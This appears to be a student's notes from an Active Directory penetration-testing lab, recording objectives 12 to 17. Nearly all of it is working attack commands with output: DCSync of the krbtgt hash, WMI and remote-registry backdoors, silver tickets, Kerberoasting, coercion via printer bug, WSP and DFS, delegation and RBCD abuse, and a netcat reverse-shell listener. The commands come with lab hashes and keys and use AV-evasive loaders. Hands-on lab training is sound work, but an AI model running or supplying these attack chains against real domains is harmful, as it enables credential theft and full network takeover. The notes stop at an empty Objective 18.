Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

#### Objective 12:

[execute the DCSync attack to pull hashes of the krbtgt user]
Check if studentx has Replication (DCSync) rights
```
. C:\AD\Tools\PowerView.ps1

Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs |?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} |?{$_.IdentityName -match "studentx"}
```

If the studentx does not have replication rights, let's add the rights.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

in new process:
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

[execute the DCSync attack to pull hashes of the krbtgt user.]

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


#### Objective 13:

[Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access]

(run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI
```
. C:\AD\Tools\RACE.ps1

Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

Now, we can execute WMI queries on the DC as studentx:
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

To retrieve machine account hash without DA, first we need to modify permissions on the DC
```
. C:\AD\Tools\RACE.ps1

Add-RemoteRegBackdoor -ComputerName dcorpdc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```

Now, we can retreive hash as studentx:
```
. C:\AD\Tools\RACE.ps1

Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
output:
ComputerName : MachineAccountHash
dcorp-dc : 1be12164a06b817e834eb437dc8f581c

We can use the machine account hash to create Silver Tickets. Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args
evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:
1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-
3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args
evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:
1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-
3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

```



#### Objective 14:

[Using the Kerberoasting attack, crack password of a SQL server service account.]

%% 
### Kerberoasting Attack
### **Part 1: The "Asking for Tickets" Phase**
1. **Any domain user** (even with low privileges) can request service tickets for **ANY service** in the domain
2. Attacker asks the Domain Controller: _"Give me tickets for these 100 different services"_
3. DC gives them **encrypted service tickets** - each encrypted with that service account's password hash

### **Part 2: The "Roasting" (Cracking) Phase**
4. Attacker takes these encrypted tickets **offline**
5. Tries to **crack the encryption** using:
    - **Brute-force**: Trying every possible password
    - **Dictionary attacks**: Common passwords
    - **Wordlists**: Company-specific terms, seasons, etc.
6. If the service account has a **weak password**, it will crack
7. Now attacker has **plaintext password** for that service account

%%

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainUser -SPN
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Roasted hashes written to : C:\AD\Tools\hashes.txt

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

```


#### Objective 15:

[Unconstrained Delegation]
First, we need to find a server that has unconstrained delegation enabled:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine

check if appadmin has local admin privileges on dcorp-appsrv.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

in the new process:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain
```
appadmin has local admin privileges on :
dollarcorp.moneycorp.local
dcorp-appsrv
dcorp-adminsrv

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorpappsrv\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-appsrv cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

now we need : to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required)

1- Use the Printer Bug for Coercion
```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

2- Use the Windows Search Protocol (MS-WSP) for Coercion
```
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

3- Use the Distributed File System Protocol (MS-DFSNM) for Coercion
```
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```


Copy the base64 encoded ticket and use it with Rubeus on student VM.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args /ptt /ticket:doIFx…
```
Now, we can run DCSync from this process:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


[Escalation to Enterprise Admins]

To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv:
```
winrs -r:dcorp-appsrv cmd

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```

then do one of ways to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required)

%% 

### Unconstrained Delegation

1. User authenticates to Domain Controller (gets TGT)
2. User accesses **Server A** (which has Unconstrained Delegation enabled)
3. **Server A not only gets a Service Ticket for itself...**
4. **...but also receives the user's TGT** (the master ticket!)
5. Now Server A can **impersonate the user to ANY service** in the domain

- The service receives the user's **TGT (Ticket Granting Ticket)**
- The service stores this TGT in its **LSASS memory**
- The service can now use this TGT to **request tickets to ANY other service AS THAT USER**

%%

#### Objective 16:

[access the service which Constrained delegation is configured.]

To enumerate users with constrained delegation we can use PowerView
```
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth
```
We already have secrets of websvc from dcorp-admisrv machine.

we request a TGS for websvc as the Domain Administrator, 
the TGS used to access the service specified in the /msdsspn parameter (which is filesystem on dcorp mssql)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u
/user:websvc
/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
/impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.
dollarcorp.moneycorp.LOCAL" /ptt
```

enumerate the computer accounts with constrained delegation enabled
```
Get-DomainComputer -TrustedToAuth
```
msds-allowedtodelegateto : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL,TIME/dcorp-DC}

there is one users: dcorp-adminsrv$
We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command
from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args
s4u /user:dcorp-adminsrv$
/aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d
/impersonateuser:Administrator /msdsspn:time/dcorpdc.
dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
[#] Impersonating user 'Administrator' to target SPN 'time/dcorpdc.dollarcorp.moneycorp.LOCAL'

Run the below command to abuse the LDAP ticket:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


#### Objective 17:

[Find a computer object in dcorp domain where we have Write permissions]
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
Recall that we compromised ciadmin from dcorp-ci. We can either use the reverse shell we have on
dcorp-ci as ciadmin or extract the credentials from dcorp-ci.
Let's use the reverse shell that we have and load PowerView there:
```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```
we get : PS C:\Users\Administrator\.jenkins\workspace\Projectx>

Now, configure RBCD on dcorp-mgmt for the student VMs. You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD:
```
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
Get-DomainRBCD
```
we get : DelegatedName : DCORP-STUDENTX$

Get AES keys of your student VM (as we configured RBCD for it above). Run the below command from an elevated shell:
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```
aes256_hmac :
bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb

[Abuse the Write permissions to access that computer as Domain Admin.]

With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -
args s4u /user:dcorp-studentX$
/aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb
/msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```


#### Objective 18:



